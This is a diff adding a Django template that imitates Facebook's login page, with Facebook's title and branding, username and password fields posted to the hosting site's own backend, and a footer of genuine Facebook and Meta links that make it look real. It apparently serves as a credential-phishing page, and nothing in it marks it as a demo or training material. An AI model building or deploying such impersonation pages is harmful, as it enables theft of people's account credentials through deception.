@@ -1,0 +1,255 @@
+{% comment %} This page is Log in with facebook {% endcomment %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook | Facebook</title>
+    {% load static %}
+    <link rel="icon" type="image/x-icon" href="{% static "img/icon.avif" %}">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+
+        }
+
+        .facebook {
+            display: flex;
+            background-color: #214794;
+            margin-bottom: 80px;
+            opacity: 2;
+
+        }
+
+        .facebook h2 {
+            color: white;
+            margin-left: 200px;
+            position: absolute;
+            font-size: 40px;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .facebook a {
+            padding-top: 40px;
+            padding-left: 390px;
+            padding-bottom: 10px;
+            font-size: 20px;
+
+        }
+
+        .facebook a .Signup {
+            padding: 8px;
+            background-color: #42B72A;
+            color: white;
+            border: none;
+            border-radius: 3px;
+        }
+
+        .table {
+            margin: 10px auto;
+            border: 1px solid lightgray;
+            padding: 35px 150px;
+            background-color: white;
+        }
+
+        .loginto {
+            margin-bottom: 20px;
+            font-weight: 520;
+            font-size: 19px;
+        }
+
+        input[type='text'],
+        [type='password'] {
+            width: 280px;
+            height: 24px;
+            padding: 5px;
+            margin-bottom: 8px;
+            border-radius: 2px;
+            border: 1px solid lightgray;
+        }
+
+        .login {
+            width: 295px;
+            height: 35px;
+            cursor: pointer;
+            background-color: #4267B2;
+            color: white;
+            font-size: 17px;
+            border: none;
+            border-radius: 2px;
+        }
+
+        .a {
+            font-size: 12px;
+            text-decoration: none;
+            color: #384898;
+        }
+
+        .notnow {
+            text-decoration: none;
+            font-size: 15px;
+            color: #384898;
+        }
+
+        .div {
+            background-color: #e9ebee;
+            height: 85vh;
+        }
+
+        .all {
+            padding-left: 180px;
+            padding-right: 140px;
+            padding-top: 200px;
+        }
+
+        .bottom {
+            text-decoration: none;
+            font-size: 12px;
+            margin: 8px;
+            /* padding-left: 10px;
+            padding-top: 10px; */
+            color: #8a8d91;
+        }
+
+        .meta {
+            font-size: 11px;
+            color: #8a8d91;
+            padding-top: 30px;
+            padding-bottom: 10px;
+            padding-left: 185px;
+
+        }
+        /* Media queries for responsiveness */
+        @media (max-width: 768px) {
+            .facebook {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .facebook h2 {
+                margin-left: 0;
+                margin-bottom: 10px;
+                font-size: 2rem;
+                text-align: center;
+            }
+
+            .facebook a {
+                margin: 0;
+            }
+            .facebook a .Signup {
+                    position: relative;
+                    right: 230px;
+                    bottom: 10px;
+                }
+
+            .table {
+                padding: 15px;
+            }
+
+            .all {
+                padding: 40px 10px 0 10px;
+                flex-direction: row;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .table {
+                padding: 10px;
+            }
+
+            input[type='text'],
+            input[type='password'] {
+                width: calc(100% - 20px);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="div">
+        <div class='facebook'>
+            <h2>facebook</h2>
+            <a href="{% url "signup" %}"><button class='Signup'>Sign Up</button></a>
+        </div>
+        <form action="" method="post">
+            {% csrf_token %}
+            <table class="table">
+                <tr align="center">
+                    <td>
+                        <div class="loginto">Log in to Facebook</div>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <input type="text" placeholder="Enter Your UserName" name="username" id="first" required>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <input type="password" name="password" id="password" placeholder=" Enter Password" required>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <button class="login">Log in</button>
+                    </td>
+                </tr>
+                <tr align="center">
+                    <td>
+                        <a href="{% url "forgottenac" %}" class="a">Forgotten account?</a>
+                        <a href="{% url "signupforfb" %}" class="a">Sign up for Facebook</a>
+                    </td>
+                </tr>
+                <tr align="center">
+                    <td>
+                        <a href="https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions%20error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%22190gyhu1twmi3y1ugnfm2kjo5jg1rak9z91dep7l0uald2a1awx9qd%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_"
+                            target='_blank' class="notnow">Not now</a>
+                    </td>
+                </tr>
+            </table>
+        </form>
+    </div>
+
+    <div class="all">
+        <a href="{% url "signupforfb" %}" class="bottom">Sign Up</a>
+        <a href="{% url "alreadyfacebookaccount" %}" class="bottom">Log in</a>
+        <a href="https://www.messenger.com/" class="bottom">Messenger</a>
+        <a href="https://www.facebook.com/lite/" class="bottom">Facebook Lite</a>
+        <a href="https://www.facebook.com/watch/" class="bottom">Video</a>
+        <a href="https://www.facebook.com/places/" class="bottom">Places</a>
+        <a href="https://www.facebook.com/gaming/play/" class="bottom">Games</a>
+        <a href="https://www.facebook.com/marketplace/" class="bottom">Marketplace</a>
+        <a href="https://about.meta.com/technologies/meta-pay/" target="_blank" class="bottom">Metaplay</a>
+        <a href="https://www.meta.com/" target="_blank" class="bottom">Meta Store</a>
+        <a href="https://www.meta.com/quest/" target="_blank" class="bottom">Meta Quest</a>
+        <a href="https://imagine.meta.com/" target="_blank" class="bottom">Imagine with Meta AI</a>
+        <a href="#" class="bottom">Istagram</a>
+        <a href="https://www.threads.net/login" class="bottom">Threads</a>
+        <a href="https://www.facebook.com/fundraisers/" class="bottom">Fundraisers</a>
+        <a href="https://www.facebook.com/biz/directory/" class="bottom">Services</a>
+        <a href="https://www.facebook.com/votinginformationcenter/" class="bottom">Voting Information Center</a>
+        <a href="https://www.facebook.com/privacy/policy/?entry_point=facebook_page_footer" class="bottom">Privacy
+            Policy</a>
+        <a href="https://www.facebook.com/privacy/center/?entry_point=facebook_page_footer" class="bottom">Privacy
+            Center</a>
+        <a href="https://www.facebook.com/groups/discover/" class="bottom">Groups</a>
+        <a href="https://about.meta.com/" class="bottom">About</a>
+        <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fads%2Fcreate%2F%3Fnav_source%3Dunknown%26campaign_id%3D402047449186%"
+            class="bottom">Create ad</a>
+        <a href="https://www.facebook.com/pages/create/?ref_type=site_footer" class="bottom">Create Page</a>
+        <a href="https://developers.facebook.com/?ref=pf" class="bottom">Developers</a>
+        <a href="https://www.metacareers.com/" class="bottom">Careers</a>
+        <a href="https://www.facebook.com/privacy/policies/cookies/?entry_point=cookie_policy_redirect&entry=0"
+            class="bottom">Cookies</a>
+        <a href="https://www.facebook.com/help/568137493302217" class="bottom">AdChoices</a>
+        <a href="https://www.facebook.com/policies_center/" class="bottom">Terms</a>
+        <a href="https://www.facebook.com/help/?ref=pf" class="bottom">Help</a>
+        <a href="https://www.facebook.com/help/637205020878504" class="bottom">Contact uploading and non-users</a>
+    </div>
+    <div class="meta">Meta @ 2024</div>
+</body>
+
+</html>
